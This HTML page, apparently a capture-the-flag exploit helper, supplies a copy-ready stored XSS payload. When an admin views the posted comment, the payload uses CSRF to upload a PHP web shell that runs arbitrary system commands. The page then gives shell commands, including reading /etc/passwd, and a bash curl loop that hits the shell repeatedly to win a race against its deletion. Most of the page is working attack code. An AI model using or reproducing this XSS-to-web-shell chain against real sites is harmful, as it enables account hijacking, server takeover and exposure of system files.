<!DOCTYPE html>
<html>
<head>
    <title>ShellRace Exploit Helper</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f0f0f0;
        }
        h1, h2 {
            color: #cc0000;
        }
        textarea {
            width: 100%;
            height: 200px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
        }
        .code-box {
            background-color: #2b2b2b;
            color: #e6e6e6;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        button {
            background-color: #cc0000;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #aa0000;
        }
        .section {
            margin: 30px 0;
            padding: 15px;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        #exploitStatus {
            font-weight: bold;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <h1>ShellRace Exploit Helper</h1>
    
    <div class="section">
        <h2>Step 1: Create XSS + CSRF Payload</h2>
        <p>This payload will create a PHP shell and upload it to the admin section:</p>
        <textarea id="xssPayload">
<script>
// Create a PHP shell with command execution capability
var phpShellCode = '<?php if(isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>';

// Method 1: Using pure HTML Form submission (more reliable)
document.write(`
    <div style="display:none">
        <form id="uploadForm" action="admin.php" method="POST" enctype="multipart/form-data" target="resultFrame">
            <input type="file" id="fileInput" name="file">
            <input type="submit" value="Upload">
        </form>
        <iframe name="resultFrame" style="display:none"></iframe>
    </div>
`);

// Create the file object
var blob = new Blob([phpShellCode], {type: 'application/x-php'});
var file = new File([blob], 'shell.php');

// Create a fake DataTransfer object to add the file
var dt = new DataTransfer();
dt.items.add(file);

// Assign the file to the file input element
setTimeout(function() {
    var fileInput = document.getElementById('fileInput');
    if (fileInput && 'files' in fileInput) {
        try {
            fileInput.files = dt.files;
            document.getElementById('uploadForm').submit();
            console.log('Form submitted via DataTransfer');
        } catch(e) {
            // Method 2: Fallback to fetch API if DataTransfer doesn't work
            console.log('Falling back to fetch API: ' + e);
            useFormDataMethod();
        }
    } else {
        console.log('File input element not found, using fetch');
        useFormDataMethod();
    }
}, 500);

// Fallback method using FormData
function useFormDataMethod() {
    var formData = new FormData();
    formData.append('file', new File([blob], 'shell.php', {type: 'application/x-php'}));
    
    fetch('admin.php', {
        method: 'POST',
        body: formData,
        credentials: 'include'
    }).then(response => {
        console.log('Shell uploaded via fetch API');
    }).catch(error => {
        console.error('Error uploading shell:', error);
    });
}
</script>
        </textarea>
        <button onclick="copyToClipboard('xssPayload')">Copy Payload</button>
    </div>
    
    <div class="section">
        <h2>Step 2: Post the XSS Payload</h2>
        <p>Log in as a regular user and post the XSS payload as a comment. Wait for the admin to view the page.</p>
    </div>
    
    <div class="section">
        <h2>Step 3: Exploit the Shell (Race Condition)</h2>
        <p>You have about 10 seconds to access the uploaded shell before it's deleted.</p>
        <div class="code-box">
            <p>Shell URL: http://target-site/uploads/shell.php?cmd=id</p>
        </div>
        <p>Try these commands:</p>
        <ul>
            <li><code>id</code> - Show user ID</li>
            <li><code>ls -la /</code> - List root directory</li>
            <li><code>cat /etc/passwd</code> - View users</li>
            <li><code>find / -name "*flag*" 2>/dev/null</code> - Find flag files</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Step 4: Shell Script for Race Condition</h2>
        <p>Use this script to repeatedly try to access the shell:</p>
        <textarea id="shellScript">
#!/bin/bash
# Race condition exploit script

TARGET="http://target-site/uploads/shell.php"
CMD="cat /flag_0xf8a2b3c4.txt"  # Adjust as needed

echo "Starting race condition exploit..."
while true; do
    response=$(curl -s "$TARGET?cmd=$CMD")
    if [[ $response == *"flag"* ]]; then
        echo "Found the flag!"
        echo "$response"
        break
    fi
    echo -n "."
    sleep 0.2
done
        </textarea>
        <button onclick="copyToClipboard('shellScript')">Copy Script</button>
    </div>
    
    <script>
        function copyToClipboard(elementId) {
            var textarea = document.getElementById(elementId);
            textarea.select();
            document.execCommand('copy');
            alert('Copied to clipboard!');
        }
    </script>
</body>
</html> 